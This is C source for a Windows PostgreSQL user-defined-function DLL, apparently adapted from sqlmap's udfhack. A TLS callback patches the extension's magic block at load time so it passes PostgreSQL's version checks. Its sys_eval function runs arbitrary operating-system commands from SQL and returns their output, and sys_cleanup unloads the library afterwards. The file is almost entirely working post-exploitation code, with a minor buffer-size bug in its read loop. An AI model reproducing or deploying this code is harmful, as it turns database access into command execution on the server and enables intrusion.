#include "postgres.h"
#include "fmgr.h"
#include <windows.h>
#include <winver.h>
#include "utils/geo_decls.h"

Pg_magic_struct Pg_magic_data = {
	sizeof(Pg_magic_struct),
	0,
	FUNC_MAX_ARGS,
	INDEX_MAX_KEYS,
	NAMEDATALEN,
	FLOAT4PASSBYVAL,
	FLOAT8PASSBYVAL
};//PG_MODULE_MAGIC_DATA;

extern PGDLLEXPORT const Pg_magic_struct *PG_MAGIC_FUNCTION_NAME(void);
const Pg_magic_struct * PG_MAGIC_FUNCTION_NAME(void) \
{
	//static const Pg_magic_struct Pg_magic_data = PG_MODULE_MAGIC_DATA;
	return &Pg_magic_data;
}
extern int no_such_variable;

#if defined(_WIN32)
	#define DLLEXPORT __declspec(dllexport) 
#else
	#define DLLEXPORT
#endif

#define WIN32_LEAN_AND_MEAN
#define NOCOMM

// _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)

void NTAPI TlsCallBack(PVOID h, DWORD dwReason, PVOID pv);

#ifdef _M_AMD64
	#pragma comment (linker, "/INCLUDE:_tls_used")
	#pragma comment (linker, "/INCLUDE:p_tls_callback1")
	#pragma const_seg(push)
	#pragma const_seg(".CRT$XLAAA")
	EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback1 = TlsCallBack;
	//#pragma const_seg(".CRT$XLAAB")
	//EXTERN_C const PIMAGE_TLS_CALLBACK p_tls_callback2 = tls_callback2;
	#pragma const_seg(pop)
#endif

#ifdef _M_IX86
	#pragma comment (linker, "/INCLUDE:__tls_used")
	#pragma comment (linker, "/INCLUDE:_p_tls_callback1")
	#pragma data_seg(push)
	#pragma data_seg(".CRT$XLAAA")
	EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback1 = TlsCallBack;
	//#pragma data_seg(".CRT$XLAAB")
	//EXTERN_C PIMAGE_TLS_CALLBACK p_tls_callback2 = tls_callback2;
	#pragma data_seg(pop)
#endif

HANDLE hLibModule = NULL;
void ForcePgMagic();

void NTAPI TlsCallBack(PVOID hModule, DWORD dwReason, PVOID pv)
{
	elog(NOTICE, "TlsCallBack: dwReason: %d", dwReason);

	if (dwReason != DLL_PROCESS_ATTACH) {
		elog(NOTICE, "TlsCallBack: dwReason != DLL_PROCESS_ATTACH");
		return;
	}

	char ModulePath[MAX_PATH] = { 0 };
	WORD* data = NULL;
	char* version = NULL;
	int major = 0, minor = 0;

	hLibModule = hModule;

	HANDLE hPostgres = GetModuleHandleA((LPCSTR)"postgres.exe");
	GetModuleFileNameA(hPostgres, ModulePath, MAX_PATH);

	DWORD  verHandle = 0;
	UINT   size = 0;
	LPBYTE lpBuffer = NULL;
	DWORD  verSize = GetFileVersionInfoSize(ModulePath, &verHandle);

	if (verSize == NULL) {
		elog(NOTICE, "[!] GetFileVersionInfoSize failed!\n");
		return;
	}

	LPSTR verData = malloc(verSize);
	if (!GetFileVersionInfo(ModulePath, verHandle, verSize, verData))
	{
		elog(NOTICE, "[!] GetFileVersionInfo failed!\n");
		return;
	}

	if (VerQueryValue(verData, "\\", (VOID FAR* FAR*)&lpBuffer, &size))
	{
		if (size)
		{
			VS_FIXEDFILEINFO *verInfo = (VS_FIXEDFILEINFO *)lpBuffer;
			if (verInfo->dwSignature == 0xfeef04bd)
			{
				// Doesn't matter if you are on 32 bit or 64 bit,
				// DWORD is always 32 bits, so first two revision numbers
				// come from dwFileVersionMS, last two come from dwFileVersionLS
				elog(NOTICE, "File Version: %d.%d.%d.%d\n",
					(verInfo->dwFileVersionMS >> 16) & 0xffff,
					(verInfo->dwFileVersionMS >> 0) & 0xffff,
					(verInfo->dwFileVersionLS >> 16) & 0xffff,
					(verInfo->dwFileVersionLS >> 0) & 0xffff
				);

				// PG_MODULE_MAGIC_DATA Patching. Here the magic happens ;-)
				int* dMagic = (int *)&Pg_magic_data;
				elog(NOTICE, "[Entry] PG_MAGIC_FUNCTION_NAME: %d\n", dMagic[1]);
				unsigned int pgMajor = (verInfo->dwFileVersionMS >> 16) & 0xffff;
				unsigned int pgMinor = (verInfo->dwFileVersionMS >> 0) & 0xffff;

				// EnterpriseDB builds for Windows set FLOAT8PASSBYVAL to false even on 64 bit architectures.
				// It changed on 9.5+ builds. This small hack is required to keep wide range compatibility on 9.x family
				// Reference: https://lists.osgeo.org/pipermail/postgis-users/2018-May/042757.html
				if ((pgMajor == 9 && pgMinor <= 4) || (pgMajor < 9)) {
					elog(NOTICE, "Version <9.5 detected. Patching FLOAT8PASSBYVAL to false");
					Pg_magic_data.float8byval = false;
				}
				dMagic[1] = (pgMajor * 100 + pgMinor);
				elog(NOTICE, "[Fixed] PG_MAGIC_FUNCTION_NAME: %d\n", dMagic[1]);

			}
		}
	}
	free(verData);
	return;
}

/*
 Some utility functions borrowed from: sqlmap project (https://github.com/sqlmapproject/udfhack).
 Source: https://github.com/sqlmapproject/udfhack/blob/master/windows/32/lib_postgresqludf_sys/lib_postgresqludf_sys/lib_postgresqludf_sys.c
*/

char *text_ptr_to_char_ptr(text *arg)
{
	char *retVal;
	int arg_size = VARSIZE(arg) - VARHDRSZ;
	retVal = (char *)malloc(arg_size + 1);

	memcpy(retVal, VARDATA(arg), arg_size);
	retVal[arg_size] = '\0';

	return retVal;
}

text *chr_ptr_to_text_ptr(char *arg)
{
	text *retVal;

	retVal = (text *)malloc(VARHDRSZ + strlen(arg));
#ifdef SET_VARSIZE
	SET_VARSIZE(retVal, VARHDRSZ + strlen(arg));
#else
	VARATT_SIZEP(retVal) = strlen(arg) + VARHDRSZ;
#endif
	memcpy(VARDATA(retVal), arg, strlen(arg));

	return retVal;
}

FILE *
compat_popen(const char *command, const char *type)
{
	size_t      cmdlen = strlen(command);
	char       *buf;
	int         save_errno;
	FILE       *res;

	/*
	* Create a malloc'd copy of the command string, enclosed with an extra
	* pair of quotes
	*/
	buf = malloc(cmdlen + 2 + 1);
	if (buf == NULL)
	{
		errno = ENOMEM;
		return NULL;
	}
	buf[0] = '"';
	memcpy(&buf[1], command, cmdlen);
	buf[cmdlen + 1] = '"';
	buf[cmdlen + 2] = '\0';

	res = _popen(buf, type);

	save_errno = errno;
	free(buf);
	errno = save_errno;

	return res;
}

PGDLLEXPORT Datum sys_eval(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(sys_eval);
Datum sys_eval(PG_FUNCTION_ARGS) {
	text *argv0 = PG_GETARG_TEXT_P(0);
	text *result_text;
	char *command;
	char *result;
	FILE *pipe;
	char *line;
	int32 outlen, linelen;

	command = text_ptr_to_char_ptr(argv0);

	// Only if you want to log
	elog(NOTICE, "Command evaluated: %s", command);


	line = (char *)malloc(1024);
	result = (char *)malloc(1);
	outlen = 0;

	result[0] = (char)0;

	pipe = compat_popen(command, "r");

	while (fgets(line, sizeof(line), pipe) != NULL) {
		linelen = strlen(line);
		result = (char *)realloc(result, outlen + linelen);
		strncpy(result + outlen, line, linelen);
		outlen = outlen + linelen;
	}

	pclose(pipe);

	if (*result) {
		result[outlen - 1] = 0x00;
	}

	result_text = chr_ptr_to_text_ptr(result);

	PG_RETURN_POINTER(result_text);
}



/*
PGDLLEXPORT Datum sys_exec(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(sys_exec);
Datum sys_exec(PG_FUNCTION_ARGS) {
	text *argv0 = PG_GETARG_TEXT_P(0);
	int32 result = 0;
	char *command;

	command = text_ptr_to_char_ptr(argv0);

	Only if you want to log
	elog(NOTICE, "Command execution: %s", command);

	result = compat_system(command);
	free(command);

	PG_FREE_IF_COPY(argv0, 0);
	PG_RETURN_INT32(result);
}
*/

PGDLLEXPORT Datum fibbonachi(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(fibbonachi);
Datum fibbonachi(PG_FUNCTION_ARGS)
{
	int32 arg = PG_GETARG_INT32(0);
	if (arg > 0 && arg < 100)
	{
		if (arg == 1 || arg == 2)
			PG_RETURN_INT32(1);
		else
		{
			int arr[100];
			arr[0] = 1;
			arr[1] = 1;
			for (int i = 2; i < arg; i++)
				arr[i] = arr[i - 1] + arr[i - 2];
			PG_RETURN_INT32(arr[arg - 1]);
		}
	}
	else
		PG_RETURN_INT32(0);
}


DWORD WINAPI CleanUp(LPVOID lpParam);

PGDLLEXPORT Datum sys_cleanup(PG_FUNCTION_ARGS);
PG_FUNCTION_INFO_V1(sys_cleanup);
Datum sys_cleanup(PG_FUNCTION_ARGS) {
	text *argv0 = PG_GETARG_TEXT_P(0);
	text *result_text;

	result_text = (text*)pgsql_version();
	if (result_text == NULL) {
		result_text = argv0;
	}

	elog(NOTICE, "Create Clenup Thread");
	CreateThread(
		NULL,                   // default security attributes
		0,                      // use default stack size  
		CleanUp,       // thread function name
		NULL,          // argument to thread function 
		0,                      // use default creation flags 
		NULL);   // returns the thread identifier 

	PG_RETURN_POINTER(result_text);
}

DWORD WINAPI CleanUp(LPVOID lpParam)
{
	elog(NOTICE, "[CleanUp] Thread Start and sleep");
	Sleep(1000);
	elog(NOTICE, "[CleanUp] About to call FreeLibraryAndExitThread");
	FreeLibraryAndExitThread(hLibModule, 0x0);
	return 0;
}